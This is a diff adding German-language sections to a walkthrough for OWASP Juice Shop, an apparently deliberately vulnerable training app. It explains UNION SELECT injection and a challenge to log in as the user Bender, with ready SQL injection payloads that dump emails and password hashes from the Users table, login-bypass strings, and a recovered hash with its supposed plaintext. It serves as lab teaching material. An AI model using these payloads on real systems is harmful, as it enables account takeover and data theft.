@@ -281,6 +281,35 @@ apple')) ORDER BY 3--
 apple')) UNION SELECT 1,2,3,4,5,6,7,8,9--
 ```
 
+### 📚 Exkurs: UNION SELECT verstehen
+UNION SELECT kombiniert Ergebnisse von zwei SQL-Queries. Wichtige Regeln:
+
+1. **Gleiche Spaltenanzahl**: Beide Queries müssen dieselbe Anzahl Spalten haben
+2. **Kompatible Datentypen**: Spalten müssen kompatible Datentypen haben
+
+**Beispiel einer normalen Query:**
+```sql
+SELECT name, price, description FROM Products WHERE name LIKE '%apple%'
+```
+
+**Mit UNION SELECT erweitert:**
+```sql
+SELECT name, price, description FROM Products WHERE name LIKE '%apple%'
+UNION SELECT username, password, email FROM Users
+```
+
+**In unserem Injection-Kontext:**
+```sql
+-- Ursprüngliche Query (vereinfacht):
+SELECT * FROM Products WHERE name LIKE '%apple%'
+
+-- Nach Injection:
+SELECT * FROM Products WHERE name LIKE '%apple')) 
+UNION SELECT 1,2,3,4,5,6,7,8,9--'
+```
+
+Die Zahlen `1,2,3,4,5,6,7,8,9` sind Platzhalter - später ersetzen wir sie mit interessanten Daten wie `username`, `password`, etc.
+
 ### 🔧 Praktisches Vorgehen:
 1. Öffne Juice Shop
 2. Klicke auf die Suchleiste (das Lupensymbol oben)
@@ -312,6 +341,126 @@ apple')) UNION SELECT name,sql,type,tbl_name,rootpage,sql,NULL,NULL,NULL FROM sq
 ```sql
 apple')) UNION SELECT email,password,role,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--
 ```
+
+### 🤖 Challenge: Als Bender einloggen
+
+**Ziel:** Einloggen als Bender Rodriguez aus Futurama ohne sein Passwort zu kennen.
+
+#### 📧 Schritt 1: Benders E-Mail-Adresse finden
+
+**Manuelle Methode:**
+1. Klicke auf verschiedene Produkte
+2. Scrolle zu den Reviews
+3. Bender kommentiert oft über fehlenden Alkohol
+
+**Automatisierte Methode - SQL Injection:**
+```sql
+-- Alle User-Emails über Produktsuche:
+')) UNION SELECT email,password,3,4,5,6,7,8,9 FROM Users--
+
+-- Gezielt nach Bender suchen:
+')) UNION SELECT email,2,3,4,5,6,7,8,9 FROM Users WHERE email LIKE '%bender%'--
+
+-- Praktisches Beispiel:
+')) UNION SELECT email||' : '||password,2,3,4,5,6,7,8,9 FROM Users WHERE email LIKE '%bender%'--
+```
+
+**Typische E-Mail-Muster testen:**
+- `bender@juice-sh.op`
+- `bender.rodriguez@juice-sh.op`
+- `bender@futurama.com`
+
+#### 🔑 Schritt 2: SQL Injection im Login
+
+1. Gehe zur Login-Seite (`Account → Login`)
+2. Öffne Developer Tools (`F12`)
+3. Wechsle zum `Network Tab`
+
+#### 🛠️ Schritt 3: SQL Injection Payload
+
+**Hauptmethode:**
+```sql
+E-Mail: bender@juice-sh.op' OR '1'='1'--
+Passwort: x (beliebig)
+```
+
+**Alternative Payloads:**
+```sql
+# Variante 1:
+bender@juice-sh.op'--
+
+# Variante 2:
+bender@juice-sh.op' OR 1=1--
+
+# Variante 3:
+bender@juice-sh.op' /*
+```
+
+#### 🔍 Schritt 4: Was passiert im Hintergrund?
+
+**Ursprüngliche SQL-Query:**
+```sql
+SELECT * FROM Users WHERE email = 'USER_INPUT' AND password = 'PASSWORD_HASH'
+```
+
+**Nach der Injection:**
+```sql
+-- Mit unserem Payload:
+SELECT * FROM Users WHERE email = 'bender@juice-sh.op' OR '1'='1'--' AND password = 'hash'
+
+-- Wird effektiv zu:
+SELECT * FROM Users WHERE email = 'bender@juice-sh.op' OR '1'='1'
+-- (Der Rest nach -- wird als Kommentar ignoriert)
+```
+
+#### 💡 Detaillierte Erklärung:
+
+1. **`bender@juice-sh.op'`** - Schließt den String für die E-Mail-Adresse
+2. **`OR '1'='1'`** - Fügt eine IMMER wahre Bedingung hinzu
+3. **`--`** - Kommentiert den Rest der Query (Passwort-Check) aus
+
+**Warum funktioniert das?**
+- Die Bedingung `OR '1'='1'` ist immer wahr
+- Durch die spezifische E-Mail wird trotzdem Bender ausgewählt
+- Der Passwort-Check wird durch `--` deaktiviert
+
+#### 🎯 Erweiterte Methoden:
+
+**API Endpoints erkunden:**
+```javascript
+// In der Browser-Konsole:
+fetch('/api/Products/1/reviews')
+fetch('/api/Products/2/reviews')
+fetch('/rest/user/whoami')
+```
+
+**Reviews mit E-Mails anzeigen:**
+```sql
+')) UNION SELECT author,email,comment,4,5,6,7,8,9 FROM Reviews--
+```
+
+#### 🔐 Gefundene Credentials:
+```
+E-Mail: bender@juice-sh.op
+Passwort-Hash: 0c36e517e3fa95aabf1bbffc6744a4ef (MD5)
+Klartext-Passwort: futurama (falls Hash gecracked)
+```
+
+**Aber:** Laut Challenge ist der Hash "not very useful" - nutze SQL Injection statt Hash-Cracking!
+
+#### ⚠️ Troubleshooting:
+
+**Falls der Login fehlschlägt:**
+1. Überprüfe die E-Mail-Adresse in den Network-Requests
+2. Teste verschiedene Kommentar-Syntaxen (`--`, `#`, `/*`)
+3. Schaue in die Developer Tools für Fehlermeldungen
+4. Prüfe ob WAF (Web Application Firewall) aktiv ist
+
+**Erfolgreiches Login erkennen:**
+- Weiterleitung zur Hauptseite
+- JWT Token im localStorage
+- "Welcome back" Nachricht
+- Bender-spezifische UI-Elemente
 
 ## 3. JWT Token Dekodierung - Admin Passwort via localStorage
 
